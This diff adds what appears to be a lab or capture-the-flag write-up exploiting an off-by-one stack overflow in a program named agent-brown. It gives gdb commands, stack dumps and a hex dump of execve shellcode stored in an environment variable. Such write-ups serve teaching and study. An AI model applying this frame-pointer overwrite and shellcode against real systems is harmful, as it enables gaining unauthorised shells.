@@ -1,0 +1,74 @@
+We can tell that there is an off-by-one error in the count because someone
+screwed up and use a leq instead of a lt in the conditions. We can see what
+this points to in memory through gdb:
+
+    b 20
+    r bOYpROBLEMSwHOSgOTtHEM
+    i f 0
+    x buf + 64
+
+Output:
+
+    (gdb) b 20
+    Breakpoint 1 at 0x80483ff: file agent-brown.c, line 20.
+    (gdb) r bOYpROBLEMSwHOSgOTtHEM
+    Starting program: /home/brown/agent-brown bOYpROBLEMSwHOSgOTtHEM
+    
+    Breakpoint 1, invoke (in=0xbffff9c3 "bOYpROBLEMSwHOSgOTtHEM") at agent-brown.c:20
+    warning: Source file is more recent than executable.
+    20        puts(buf);
+    (gdb) i f 0
+    Stack frame at 0xbffff7f0:
+     eip = 0x80483ff in invoke (agent-brown.c:20); saved eip 0x804841d
+     called by frame at 0xbffff800
+     source language c.
+     Arglist at 0xbffff7e8, args: in=0xbffff9c3 "bOYpROBLEMSwHOSgOTtHEM"
+     Locals at 0xbffff7e8, Previous frame's sp is 0xbffff7f0
+     Saved registers:
+      ebp at 0xbffff7e8, eip at 0xbffff7ec
+    (gdb) x buf + 64
+    0xbffff7e8:     0xbffff7f8
+
+We can see that the pointer immediately after buf on the stack is the saved frame
+pointer. This means that, after executing the instructions of the next frame, the
+address of the next address in memory will be treated as the RIP. We know that we
+can overwrite the last byte with any character, so we can put that at the beginning
+of the buffer. In the buffer, we will write the address of the $egg environment
+variable (adjusted for the casing in the code), and the $egg environment variable
+will contain the shellcode.
+
+Before running our exploit, the stack is as follows:
+
+    (gdb) x/32x buf
+    0xbffff718:     0x00000000      0xb7ff3fdc      0xbffff7d4      0x00000000
+    0xbffff728:     0x00000000      0xb7e5f043      0x0804820e      0x00000000
+    0xbffff738:     0x00c10000      0x00000001      0xbffff914      0x0000002f
+    0xbffff748:     0xbffff79c      0xb7fd2000      0x080484b0      0x080482f0
+    0xbffff758:     0xbffff768      0x0804841d      0xbffff92c      0xbffff768
+    0xbffff768:     0xbffff788      0x0804845c      0xbffff92c      0x0804965c
+    0xbffff778:     0xbffff798      0xbffff7a0      0xb7fed270      0xbffff7a0
+    0xbffff788:     0x00000000      0xb7e454d3      0x080484b0      0x00000000
+
+After running our exploit, the stack looks as follows:
+
+    (gdb) x/32x buf
+    0xbffff718:     0xbffff71c      0xbfffff5f      0xbfffff5f      0xbfffff5f
+    0xbffff728:     0xbfffff5f      0xbfffff5f      0xbfffff5f      0xbfffff5f
+    0xbffff738:     0xbfffff5f      0xbfffff5f      0xbfffff5f      0xbfffff5f
+    0xbffff748:     0xbfffff5f      0xbfffff5f      0xbfffff5f      0xbfffff5f
+    0xbffff758:     0xbffff718      0x0804841d      0xbffff92c      0xbffff768
+    0xbffff768:     0xbffff788      0x0804845c      0xbffff92c      0x0804965c
+    0xbffff778:     0xbffff798      0xbffff7a0      0xb7fed270      0xbffff7a0
+    0xbffff788:     0x00000000      0xb7e454d3      0x080484b0      0x00000000
+
+And the environment variable at 0xbfffff5f:
+
+    (gdb) x/32x 0xbfffff5f
+    0xbfffff5f:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
+    0xbfffff6f:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
+    0xbfffff7f:     0xffdce880      0x622fffff      0x732f6e69      0xdeadbe68
+    0xbfffff8f:     0xdeadbeef      0xdeadbeef      0xdeadbeef      0xdeadbeef
+    0xbfffff9f:     0xdeadbeef      0xdeadbeef      0xdeadbeef      0xdeadbeef
+    0xbfffffaf:     0xdeadbeef      0xdeadbeef      0xdeadbeef      0xdeadbeef
+    0xbfffffbf:     0xdeadbeef      0xdeadbeef      0x52455400      0x63733d4d
+    0xbfffffcf:     0x6e656572      0x44575000      0x6f682f3d      0x622f656d
